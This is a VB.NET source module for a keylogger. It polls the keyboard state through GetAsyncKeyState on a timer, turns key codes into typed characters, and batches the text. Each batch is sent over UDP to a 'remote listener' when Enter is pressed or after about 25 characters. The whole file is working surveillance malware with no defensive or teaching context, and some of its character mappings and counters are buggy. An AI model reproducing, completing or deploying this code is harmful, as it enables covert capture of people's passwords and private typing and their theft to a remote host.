Option Strict On

Module keyStrokes
    Dim addKey As String
    Dim addKeyTotal As String
    Dim keyPressed As Integer
    Dim charCount As Int32
    Dim lineLimit As Int32 = 25

    ' Create a timer to look for new key strokes
    ' Defaults options set on module load in sub New
    Public WithEvents timer1 As Windows.Forms.Timer = New Windows.Forms.Timer

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Short

    Sub New()

        ' Set Timer1 defaults
        timer1.Interval = 50
        timer1.Enabled = False

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next

        'check Enter key
        keyPressed = GetAsyncKeyState(13)
        If keyPressed = -32767 Then
            charCount = 0
            addKey = vbCrLf
            GoTo KeyFound
        End If

        'check for backspace
        keyPressed = GetAsyncKeyState(8)
        If keyPressed = -32767 Then
            addKey = "[bs]"
            charCount += 4
            GoTo KeyFound
        End If

        'check for space bar
        keyPressed = GetAsyncKeyState(32)
        If keyPressed = -32767 Then
            addKey = " "
            GoTo KeyFound
            charCount += 1
        End If

        'check for colon/semicolon
        keyPressed = GetAsyncKeyState(186)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = ";"
            Else
                addKey = ":"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for =/+
        keyPressed = GetAsyncKeyState(187)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "="
            Else
                addKey = "+"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for ,/<
        keyPressed = GetAsyncKeyState(188)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = ","
            Else
                addKey = "<"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for -/_
        keyPressed = GetAsyncKeyState(189)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "-"
            Else
                addKey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for ./>
        keyPressed = GetAsyncKeyState(190)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "."
            Else
                addKey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for //?
        keyPressed = GetAsyncKeyState(191)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "/"
            Else
                addKey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for `/~
        keyPressed = GetAsyncKeyState(192)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "`"
            Else
                addKey = "~"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 0/)
        keyPressed = GetAsyncKeyState(96)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "0"
            Else
                addKey = ")"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 1/!
        keyPressed = GetAsyncKeyState(97)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "1"
            Else
                addKey = "!"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 2/@
        keyPressed = GetAsyncKeyState(98)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "2"
            Else
                addKey = "@"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 3/#
        keyPressed = GetAsyncKeyState(99)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "3"
            Else
                addKey = "#"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 4/$
        keyPressed = GetAsyncKeyState(100)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "4"
            Else
                addKey = "$"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 5/%
        keyPressed = GetAsyncKeyState(101)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "5"
            Else
                addKey = "%"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 6/^
        keyPressed = GetAsyncKeyState(102)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "6"
            Else
                addKey = "7"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 7/&
        keyPressed = GetAsyncKeyState(103)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "7"
            Else
                addKey = "&"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 8/*
        keyPressed = GetAsyncKeyState(104)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "8"
            Else
                addKey = "*"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for 9/(
        keyPressed = GetAsyncKeyState(105)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "9"
            Else
                addKey = "("
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'other num/special chars
        keyPressed = GetAsyncKeyState(106)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "*"
                charCount += 1
            Else
                addKey = ""
            End If
            GoTo KeyFound
        End If

        keyPressed = GetAsyncKeyState(107)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "+"
            Else
                addKey = "="
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(108)
        If keyPressed = -32767 Then
            addKey = ""
            GoTo KeyFound
        End If

        keyPressed = GetAsyncKeyState(109)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "-"
            Else
                addKey = "_"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(110)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "."
            Else
                addKey = ">"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(111)
        If keyPressed = -32767 Then
            addKey = "/"
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(2)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "/"
            Else
                addKey = "?"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(220)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "\"
            Else
                addKey = "|"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(222)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "'"
            Else
                addKey = Chr(34)
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(221)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "]"
            Else
                addKey = "}"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        keyPressed = GetAsyncKeyState(219)
        If keyPressed = -32767 Then
            If getShift() = False Then
                addKey = "["
            Else
                addKey = "{"
            End If
            GoTo KeyFound
            charCount += 1
        End If

        'check for a-z upper and lower case
        For i = 65 To 128
            keyPressed = GetAsyncKeyState(i)
            If keyPressed = -32767 Then
                If getShift() = False Then
                    If getCapslock() = True Then
                        addKey = UCase(Chr(i))
                    Else
                        addKey = LCase(Chr(i))
                    End If
                Else
                    If getCapslock() = False Then
                        addKey = UCase(Chr(i))
                    Else
                        addKey = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        For i = 48 To 57
            keyPressed = GetAsyncKeyState(i)
            If keyPressed = -32767 Then
                If getShift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            addKey = "!"
                        Case 2
                            addKey = "@"
                        Case 3
                            addKey = "#"
                        Case 4
                            addKey = "$"
                        Case 5
                            addKey = "%"
                        Case 6
                            addKey = "^"
                        Case 7
                            addKey = "&"
                        Case 8
                            addKey = "*"
                        Case 9
                            addKey = "("
                        Case 0
                            addKey = ")"
                    End Select
                Else
                    addKey = Chr(i)
                End If
                GoTo KeyFound
                charCount += 1
            End If
        Next i

        System.Windows.Forms.Application.DoEvents()
        Exit Sub

        'keyfound 
KeyFound:

        ' Keep a collection of key strokes until a limit is reached, then send them.
        addKeyTotal += addKey
        Debug.Print(addKeyTotal)

        ' If a key was detected, then send it via UDP
        If (addKey <> "" And charCount > lineLimit) Or addKey = vbCrLf Then

            ' Send to remote listener
            udp_Send.send(addKeyTotal)

            addKeyTotal = ""
        End If

        ' Reset the count. If so many chars were collected, then send them as a batch. This is done in case the Enter/Return key is not being used
        If charCount > lineLimit Then
            charCount = 0
        End If

        ' Do some pent up events
        System.Windows.Forms.Application.DoEvents()

    End Sub

    Public Function getShift() As Boolean
        'check to see if the shift key is pressed
        getShift = CBool(GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
    End Function
    Public Function getCapslock() As Boolean
        'return or set the caps lock toggle
        getCapslock = CBool(GetKeyState(System.Windows.Forms.Keys.Capital) And 1)
    End Function
End Module
